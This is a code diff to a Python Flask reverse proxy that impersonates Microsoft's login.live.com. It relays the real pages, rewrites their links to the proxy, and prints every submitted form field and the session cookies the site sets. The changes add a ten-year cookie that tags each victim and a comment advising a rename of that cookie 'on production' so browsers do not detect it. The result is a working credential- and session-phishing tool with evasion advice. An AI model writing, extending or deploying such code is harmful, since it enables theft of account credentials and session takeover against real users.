@@ -9,16 +9,19 @@ import os
 import re
 import logging
 import art
-from flask import Flask, request, Response
+from flask import Flask, request, Response, make_response
 from urllib.parse import urlparse
-from datetime import datetime
+from datetime import datetime, timedelta
 from colorama import Fore, Style, init
 from threading import Lock
+import uuid
 
 # Constants
 FINAL_ENDPOINT = "https://login.live.com"
 REVERSE_PROXY_URL = "http://127.0.0.1:8887"
 URL_REPLACEMENT_REGEX = r'https://(login\.)?live\.com'
+PROXY_COOKIE_NAME = "PIGE_ID"
+# Change PROXY_COOKIE_NAME on production since browsers will start to detect it (Use something related to the target domain's cookies)
 
 # Parse REVERSE_PROXY_URL for the Referer replacement
 reverse_proxy_parsed = urlparse(REVERSE_PROXY_URL)
@@ -38,15 +41,22 @@ app = Flask(__name__)
 init()
 print_lock = Lock()
 
+def set_or_get_user_cookie():
+    user_id = request.cookies.get(PROXY_COOKIE_NAME)
+    if not user_id:
+        user_id = str(uuid.uuid4())
+    return user_id
+
 @app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
 @app.route('/<path:path>', methods=['GET', 'POST'])
 def catch_all(path):
+    user_id = set_or_get_user_cookie()
+    
     _, ext = os.path.splitext(path)
     
     url = f"{FINAL_ENDPOINT}/{path}"
     headers = {'User-Agent': request.headers.get('User-Agent', '')}
     
-    # Modify the Referer header here
     referer = request.headers.get('Referer', '')
     if reverse_proxy_netloc in referer:
         headers['Referer'] = referer.replace(REVERSE_PROXY_URL, FINAL_ENDPOINT)
@@ -55,11 +65,10 @@ def catch_all(path):
         resp = requests.post(url, headers=headers, data=request.form, verify=False)
         if len(request.form) > 0:
             with print_lock:
-                print(f"{Fore.BLUE}{get_timestamp()} - {Fore.GREEN}Form data from POST request:{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}{user_id} - {get_timestamp()} => {Fore.GREEN}Form data from POST request:{Style.RESET_ALL}")
                 for key, value in request.form.items():
-                    print(f"{Fore.BLUE}{get_timestamp()} - {Fore.YELLOW}{key}: {value}{Style.RESET_ALL}")
+                    print(f"{Fore.BLUE}{user_id} - {get_timestamp()} => {Fore.YELLOW}{key}: {value}{Style.RESET_ALL}")
                 print()  # New empty line after form data
-    
     else:
         resp = requests.get(url, headers=headers, verify=False)
 
@@ -71,17 +80,20 @@ def catch_all(path):
         if any(subtype in content_type for subtype in ['text/', 'application/javascript', 'application/json']):
             decoded_content = resp.content.decode(charset)
             modified_content = re.sub(URL_REPLACEMENT_REGEX, REVERSE_PROXY_URL, decoded_content)
-
-            # Attempt to replace the 'Referer' in the meta tags or JavaScript code
-            referer_replace_pattern = fr'(["\']){re.escape(REVERSE_PROXY_URL)}(["\'])'
-            modified_content = re.sub(referer_replace_pattern, f'\\1{FINAL_ENDPOINT}\\2', modified_content)
-
+            resp_flask = make_response(modified_content.encode(charset))
+            resp_flask.headers.set('Content-Type', content_type)
+            
             if 'Set-Cookie' in resp.headers:
                 with print_lock:
-                    print(f"{Fore.BLUE}{get_timestamp()} - {Fore.GREEN}Cookie Set or Changed by Remote Host:{Style.RESET_ALL} {Fore.MAGENTA}{resp.headers['Set-Cookie']}{Style.RESET_ALL}")
+                    print(f"{Fore.BLUE}{user_id} - {get_timestamp()} => {Fore.GREEN}Cookie Set or Changed by Remote Host:{Style.RESET_ALL} {Fore.MAGENTA}{resp.headers['Set-Cookie']}{Style.RESET_ALL}")
                     print()  # New empty line after cookie data
 
-            return Response(modified_content.encode(charset), content_type=content_type)
+            if not request.cookies.get(PROXY_COOKIE_NAME):
+                expire_date = datetime.now()
+                expire_date = expire_date + timedelta(days=3650)  # 10 years from now
+                resp_flask.set_cookie(PROXY_COOKIE_NAME, user_id, expires=expire_date)
+                
+            return resp_flask
         else:
             return Response(resp.content, content_type=content_type)
     except UnicodeDecodeError:
